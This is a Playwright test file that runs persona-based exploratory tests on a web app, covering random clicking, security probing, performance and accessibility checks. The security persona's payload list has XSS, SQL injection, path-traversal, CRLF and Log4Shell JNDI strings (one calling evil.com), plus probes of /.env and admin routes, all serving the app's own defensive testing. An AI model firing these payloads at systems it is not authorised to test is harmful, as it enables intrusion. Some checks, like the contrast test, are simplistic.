import { test, expect, Page } from '@playwright/test';

/**
 * Intelligent Testing System
 * Uses AI-like behavior patterns to explore the app like real users
 */

interface TestPersona {
  name: string;
  traits: string[];
  testStrategy: (page: Page) => Promise<void>;
}

class IntelligentTester {
  private issues: Array<{
    type: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    location: string;
    screenshot?: string;
  }> = [];

  /**
   * Run intelligent exploratory tests
   */
  async exploreApp(page: Page, persona: TestPersona) {
    console.log(`\n🤖 Testing as: ${persona.name}`);
    console.log(`   Traits: ${persona.traits.join(', ')}`);

    await persona.testStrategy(page);
    
    // After each persona test, analyze what we found
    await this.analyzeFindings(page);
  }

  /**
   * Chaotic User - Clicks everything rapidly
   */
  async chaoticUserTest(page: Page) {
    await page.goto('/');
    
    // Find all interactive elements
    const interactiveElements = await page.$$('button, a, input, select, [onclick]');
    
    console.log(`Found ${interactiveElements.length} interactive elements`);
    
    // Randomly click elements
    for (let i = 0; i < Math.min(20, interactiveElements.length); i++) {
      try {
        const randomIndex = Math.floor(Math.random() * interactiveElements.length);
        const element = interactiveElements[randomIndex];
        
        if (await element.isVisible()) {
          await element.click({ force: true, timeout: 1000 });
          
          // Check for errors after each click
          await this.checkForErrors(page);
          
          // Random navigation
          if (Math.random() > 0.7) {
            await page.goBack();
          }
        }
      } catch (e) {
        // Element might be gone, that's interesting!
        this.issues.push({
          type: 'stability',
          severity: 'medium',
          description: 'Element disappeared after interaction',
          location: page.url()
        });
      }
    }
  }

  /**
   * Security Tester - Tries to break things
   */
  async securityTesterTest(page: Page) {
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "' OR '1'='1",
      '../../../etc/passwd',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '${jndi:ldap://evil.com/a}',
      '%0d%0aSet-Cookie: admin=true'
    ];

    // Try each input in every field
    await page.goto('/login');
    
    for (const payload of maliciousInputs) {
      const inputs = await page.$$('input:not([type="submit"]), textarea');
      
      for (const input of inputs) {
        try {
          await input.fill(payload);
          
          // Try to submit
          const form = await input.evaluateHandle(el => el.closest('form'));
          if (form) {
            await page.keyboard.press('Enter');
            await page.waitForTimeout(500);
            
            // Check response
            const bodyText = await page.textContent('body');
            
            // Check for vulnerabilities
            if (bodyText?.includes(payload)) {
              this.issues.push({
                type: 'security',
                severity: 'critical',
                description: `Potential XSS: Input not sanitized`,
                location: page.url()
              });
            }
            
            if (bodyText?.match(/SQL|syntax|database/i)) {
              this.issues.push({
                type: 'security',
                severity: 'critical',
                description: 'SQL error exposed',
                location: page.url()
              });
            }
          }
        } catch (e) {
          // Input might be protected, good!
        }
      }
    }
    
    // Try accessing protected routes
    const protectedRoutes = [
      '/admin',
      '/api/users',
      '/dashboard/admin',
      '/.env',
      '/config',
      '/wp-admin'
    ];
    
    for (const route of protectedRoutes) {
      await page.goto(route, { waitUntil: 'domcontentloaded' });
      
      if (!page.url().includes('login') && !page.url().includes('404')) {
        this.issues.push({
          type: 'security',
          severity: 'high',
          description: `Unauthorized access to ${route}`,
          location: route
        });
      }
    }
  }

  /**
   * Performance Tester - Stress tests the app
   */
  async performanceTesterTest(page: Page) {
    // Test with throttled connection
    const client = await page.context().newCDPSession(page);
    await client.send('Network.emulateNetworkConditions', {
      offline: false,
      downloadThroughput: 50 * 1024 / 8, // 50kb/s
      uploadThroughput: 20 * 1024 / 8,
      latency: 2000
    });

    const startTime = Date.now();
    await page.goto('/', { waitUntil: 'networkidle' });
    const loadTime = Date.now() - startTime;

    if (loadTime > 10000) {
      this.issues.push({
        type: 'performance',
        severity: 'high',
        description: `Slow load time on poor connection: ${loadTime}ms`,
        location: '/'
      });
    }

    // Test rapid interactions
    await page.goto('/dashboard/applicants');
    
    // Rapidly filter/sort
    for (let i = 0; i < 10; i++) {
      if (await page.locator('select[name="sort"]').isVisible()) {
        await page.selectOption('select[name="sort"]', { index: i % 3 });
      }
      
      if (await page.locator('input[type="search"]').isVisible()) {
        await page.fill('input[type="search"]', `test${i}`);
      }
    }

    // Check memory usage
    const metrics = await page.evaluate(() => {
      if ('memory' in performance) {
        return (performance as any).memory.usedJSHeapSize;
      }
      return 0;
    });

    if (metrics > 100 * 1024 * 1024) { // 100MB
      this.issues.push({
        type: 'performance',
        severity: 'medium',
        description: `High memory usage: ${Math.round(metrics / 1024 / 1024)}MB`,
        location: page.url()
      });
    }
  }

  /**
   * Accessibility Tester
   */
  async accessibilityTesterTest(page: Page) {
    await page.goto('/');
    
    // Check for missing alt text
    const imagesWithoutAlt = await page.$$eval('img:not([alt])', imgs => imgs.length);
    if (imagesWithoutAlt > 0) {
      this.issues.push({
        type: 'accessibility',
        severity: 'medium',
        description: `${imagesWithoutAlt} images missing alt text`,
        location: page.url()
      });
    }

    // Check color contrast
    const lowContrastElements = await page.evaluate(() => {
      const elements = document.querySelectorAll('*');
      const issues = [];
      
      for (const el of elements) {
        const style = window.getComputedStyle(el);
        const bg = style.backgroundColor;
        const fg = style.color;
        
        // Simple contrast check (would need proper algorithm)
        if (bg && fg && bg !== 'rgba(0, 0, 0, 0)') {
          // Check if colors are too similar
          // This is simplified - real contrast checking is complex
          issues.push(el.tagName);
        }
      }
      
      return issues.length;
    });

    // Test keyboard navigation
    await page.keyboard.press('Tab');
    const focusedElement = await page.evaluate(() => document.activeElement?.tagName);
    
    if (!focusedElement || focusedElement === 'BODY') {
      this.issues.push({
        type: 'accessibility',
        severity: 'high',
        description: 'Keyboard navigation not working',
        location: page.url()
      });
    }
  }

  /**
   * Check for errors after actions
   */
  async checkForErrors(page: Page) {
    // JavaScript errors
    page.on('pageerror', error => {
      this.issues.push({
        type: 'javascript',
        severity: 'high',
        description: error.message,
        location: page.url()
      });
    });

    // Console errors
    page.on('console', msg => {
      if (msg.type() === 'error') {
        this.issues.push({
          type: 'console',
          severity: 'medium',
          description: msg.text(),
          location: page.url()
        });
      }
    });

    // Network errors
    page.on('requestfailed', request => {
      this.issues.push({
        type: 'network',
        severity: 'high',
        description: `Failed request: ${request.url()}`,
        location: page.url()
      });
    });
  }

  /**
   * Analyze findings and generate report
   */
  async analyzeFindings(page: Page) {
    // Take screenshot if issues found
    if (this.issues.length > 0) {
      const screenshot = await page.screenshot({ fullPage: true });
      // Save screenshot with timestamp
    }
  }

  /**
   * Generate comprehensive report
   */
  generateReport() {
    console.log('\n📊 Intelligent Test Report\n');
    console.log('='.repeat(50));
    
    const criticalIssues = this.issues.filter(i => i.severity === 'critical');
    const highIssues = this.issues.filter(i => i.severity === 'high');
    
    console.log(`\n🚨 Critical Issues: ${criticalIssues.length}`);
    criticalIssues.forEach(issue => {
      console.log(`   - ${issue.description} (${issue.type}) at ${issue.location}`);
    });
    
    console.log(`\n⚠️  High Priority Issues: ${highIssues.length}`);
    highIssues.forEach(issue => {
      console.log(`   - ${issue.description} (${issue.type}) at ${issue.location}`);
    });
    
    console.log(`\n📊 Summary:`);
    console.log(`   Total Issues: ${this.issues.length}`);
    console.log(`   Security Issues: ${this.issues.filter(i => i.type === 'security').length}`);
    console.log(`   Performance Issues: ${this.issues.filter(i => i.type === 'performance').length}`);
    console.log(`   Accessibility Issues: ${this.issues.filter(i => i.type === 'accessibility').length}`);
    
    return this.issues;
  }
}

// Test personas with different strategies
const testPersonas: TestPersona[] = [
  {
    name: 'Chaos Monkey',
    traits: ['Impatient', 'Random', 'Fast'],
    testStrategy: async (page) => {
      const tester = new IntelligentTester();
      await tester.chaoticUserTest(page);
      return tester.generateReport();
    }
  },
  {
    name: 'Security Researcher',
    traits: ['Malicious', 'Thorough', 'Technical'],
    testStrategy: async (page) => {
      const tester = new IntelligentTester();
      await tester.securityTesterTest(page);
      return tester.generateReport();
    }
  },
  {
    name: 'Performance Auditor',
    traits: ['Systematic', 'Metrics-focused', 'Stress-tester'],
    testStrategy: async (page) => {
      const tester = new IntelligentTester();
      await tester.performanceTesterTest(page);
      return tester.generateReport();
    }
  },
  {
    name: 'Accessibility Advocate',
    traits: ['Thorough', 'Standards-focused', 'Inclusive'],
    testStrategy: async (page) => {
      const tester = new IntelligentTester();
      await tester.accessibilityTesterTest(page);
      return tester.generateReport();
    }
  }
];

// Run intelligent tests
test.describe('Intelligent System Testing', () => {
  test.describe.configure({ mode: 'serial' });

  for (const persona of testPersonas) {
    test(`${persona.name} explores the app`, async ({ page }) => {
      const tester = new IntelligentTester();
      await tester.exploreApp(page, persona);
    });
  }
});